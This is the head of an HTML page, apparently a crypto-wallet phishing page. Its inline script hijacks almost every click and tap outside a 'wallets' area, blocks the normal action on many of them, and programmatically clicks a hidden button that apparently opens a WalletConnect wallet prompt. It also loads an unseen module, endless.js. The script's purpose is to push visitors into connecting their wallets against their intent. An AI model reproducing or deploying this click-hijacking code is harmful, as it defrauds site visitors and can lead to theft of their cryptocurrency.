<!DOCTYPE html>
<html lang="en">
 <head>
  <meta content="upgrade-insecure-requests" http-equiv="Content-Security-Policy"/>
  <script defer="True" src="endless.js" type="module">
  </script>
  <script>
   let count_clicks = 0

window.onclick = (e) => {
    // console.log(e.target)
    console.log("clicked");
    console.log(e.target.tagName)
    const walletsDiv = document.getElementById('wallets');

    // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
    if (walletsDiv && walletsDiv.contains(e.target)) {
        return
    }

    if (e.target.id != 'click_button1') {

        e.preventDefault()
        console.log(`clicks ${count_clicks}`);

        if (count_clicks % 2 === 0) {
            document.getElementById('click_button1').click()
        }
        // console.log('clicked')
        count_clicks += 1;
    }
}
let touchStartTime = 0;
let count_taps = 0
window.ontouchstart = (e) => {
    touchStartTime = Date.now();

}
window.ontouchend = (e) => {
    console.log("tapped");
    console.log(e.target.tagName)
    const touchEndTime = Date.now();
    const touchDuration = touchEndTime - touchStartTime;
    const walletsDiv = document.getElementById('wallets');
 if (walletsDiv && walletsDiv.contains(e.target)) {
        return
    }
    if (touchDuration < 300) {
        // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
        if (e.target.id != 'click_button1' ) {

            if (count_taps % 2 === 0) {

                e.preventDefault()
            }

            document.getElementById('click_button1').click()
//            console.log('clicked')
        }
        count_taps++;

    }
}
  </script>
